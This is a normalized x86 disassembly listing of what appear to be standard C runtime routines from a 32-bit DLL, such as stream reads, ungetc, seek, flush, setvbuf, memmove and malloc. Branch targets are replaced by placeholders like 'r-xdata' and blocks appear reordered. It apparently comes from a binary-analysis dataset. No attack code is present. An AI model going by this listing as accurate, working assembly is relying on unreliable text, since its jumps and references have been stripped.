add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_100296d2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_1002d4db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_10030cf5
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_10029ddd
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_10031f47
pop ecx
push eax
call sub_100326ac
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_1002a0f0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_10029834
push 0xc
push r--data
call sub_1002fdfc
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100296d2
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100298ac
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
call sub_1002fe41
retn
sub_100298b6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_10031f47
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_1002d4db
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_10032788
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_100299a7
push 0xc
push r--data
call sub_1002fdfc
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100298b6
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10029a0f
mov eax [ ebp - 0x1c ]
call sub_1002d4db
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1002fe41
retn
sub_10029a19
push 0xc
push r--data
call sub_1002fdfc
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_10031f47
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1002fe41
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10029b15
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_100327d1
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_10029b1d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10029ddd
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_10032a4d
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10031f47
pop ecx
push eax
call sub_10032971
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_10029ba7
push 0xc
push r--data
call sub_1002fdfc
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10029b1d
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10029c22
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_1002fe41
retn
cmp edi 0x2
jne r-xdata
sub_10029c2c
mov edi edi
push ebp
mov ebp esp
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
call sub_1002d4db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10032f36
pop ecx
mov ecx eax
mov [ esi ] eax
and ecx edx
or eax 0xffffffff
mov [ esi + 0x4 ] edx
cmp ecx eax
je r-xdata
call sub_1002d4db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop ebp
retn
pop esi
xor eax eax
sub_10029c9a
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_1003301c
add esp 0x10
pop esi
pop ebp
retn
sub_10029cdf
push 0xc
push r--data
call sub_1002fdfc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi ebx
setne al
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x4
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_1002fe41
retn
mov edi [ ebp + 0x14 ]
lea eax [ edi - 0x2 ]
cmp eax 0x7ffffffd
jbe r-xdata
cmp eax 0x40
jne r-xdata
cmp eax 0x40
jne r-xdata
and edi 0xfffffffe
mov [ ebp + 0x8 ] esi
push esi
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] ebx
push esi
call sub_10029ddd
push esi
call sub_1003306b
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test [ ebp + 0x10 ] 0x4
je r-xdata
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
or ecx 0x4
lea eax [ esi + 0x14 ]
push 0x2
pop edi
jmp r-xdata
or ecx 0x500
push edi
call sub_1002ddb0
pop ecx
cmp eax ebx
jne r-xdata
mov [ esi + 0xc ] ecx
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10029dd3
mov eax [ ebp - 0x1c ]
sub_10029ddd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10031f47
pop ecx
push eax
call sub_100326ac
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10029e45
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10029ddd
pop ecx
test eax eax
je r-xdata
push esi
call sub_10029e8d
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10031f47
push eax
call sub_1003309c
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10029e8d
push 0x14
push r--data
call sub_1002fdfc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10029f5e
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1002fe41
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1002a686
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_10029f2f
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10029e45
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10029e45
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10029f67
push 0xc
push r--data
call sub_1002fdfc
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_10029e45
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10029fb0
mov eax [ ebp - 0x1c ]
push esi
call sub_10029e8d
pop ecx
jmp r-xdata
call sub_1002fe41
retn
sub_10029fc3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1002d4db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_10029ddd
push esi
mov ebx eax
call sub_1003306b
push esi
call sub_10031f47
push eax
call sub_10033219
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_10027a85
pop ecx
mov [ esi + 0x1c ] edi
sub_1002a03a
push 0xc
push r--data
call sub_1002fdfc
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_10029fc3
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002a0ae
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_1002fe41
retn
mov eax [ ebp - 0x1c ]
sub_1002a0f0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1002a178 ]
jmp [ ecx * 4 + jump_table_1002a1f8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002a264 ]
pop esi
pop edi
pop ebp
jmp sub_1003336d
jmp [ ecx * 4 + jump_table_1002a400 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1002a304 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002a400 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1002a264 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1002a400 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002a264 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002a264 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002a264 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002a400 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002a400 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002a400 ]
sub_1002a455
push 0xc
push r--data
call sub_1002fdfc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
push 0x4
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10030a10
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002a49b
sub_1002a4a4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_1002e854
pop ecx
call sub_1002d4db
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_10031d49
push 0x1e
call sub_10031b9e
push 0xff
call sub_1002abcf
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_1002a455
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_1002d4db
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_1002e854
pop ecx
test eax eax
je r-xdata
call sub_1002d4db
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_1002a574
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1002ddf5
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1002ddf5
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1002a645
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_100301fe
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_1002a686
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_100301fe
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_1002a6b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10030124
pop ecx
pop ebp
retn
sub_1002a6f4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10030124
pop ecx
pop ebp
retn
sub_1002a723
push 0xc
push r--data
call sub_1002fdfc
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
push ebx
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] esi
test [ ebx + 0xc ] 0x40
jne r-xdata
call sub_1002fe41
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push ebx
call sub_10031f47
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002a835
mov eax [ ebp - 0x1c ]
push ebx
call sub_10033e3a
mov edi eax
lea eax [ ebp + 0x10 ]
push eax
push esi
push [ ebp + 0xc ]
push ebx
call sub_10030eb2
mov [ ebp - 0x1c ] eax
push ebx
push edi
call sub_10033ed6
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
